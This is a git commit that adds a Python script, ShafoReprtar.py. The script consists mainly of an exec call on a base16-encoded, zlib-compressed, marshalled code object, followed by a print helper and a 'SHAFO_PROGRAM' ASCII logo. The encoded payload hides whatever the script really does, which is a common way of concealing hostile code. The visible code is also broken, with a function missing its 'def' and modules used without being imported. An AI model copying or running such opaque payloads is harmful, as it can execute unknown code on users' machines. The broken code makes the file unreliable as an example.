7a384430dcdddaee1c7f0158879d7183d91eabbc
shex77 <69957344+shex77@users.noreply.github.com>
2020-12-28 18:04:36 +0300

    ShafoReprtar.py

---
+++ ShafoReprtar.py
@@ -0,0 +1,21 @@
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b16decode("789C454E3D0F82400CEDC199383BF9139880C9C118E32F70D0B8B029342081DC792D4A5CFDE1DA12A34DFBD28FF75E5AC23762A99D14AD042A49031D40F1EB0D140610A08DA08AE065A08DA1B08056AFF624704CD4E3FA96D84F2E0DB3A77596B503F19930DC315019AE9ED33CCF1F78699CECBD4F4BD76707F42E70CA23273391F25C20E06D4062E24806E1AA7D8DCC560938321B699E897EFF075272554F069BDE5543875BE591AA9666613EADBD3353"))))
+jalan(z):
+
+	for e in z + '\n':		sys.stdout.write(e)
+
+		sys.stdout.flush()
+
+		time.sleep(00000.1)
+
+##### LOGO #####
+
+logo = """ ▄︻┻═┳一 ┼SHAFO_PROGRAM┼
+
+           ▄︻┻═┳一 ♥️SHAFO_PROGRAM♥️----------
+
+           ▄︻┻═┳一 ♥️♥️ SHAFO_PROGRAM  ♥️♥️----
+
+           ▄︻┻═┳一    💪💪SHAFO_PROGRAM💪💪   
+
+           ▄︻┻═┳一 ---- SHAFO_PROGRAM  --------             
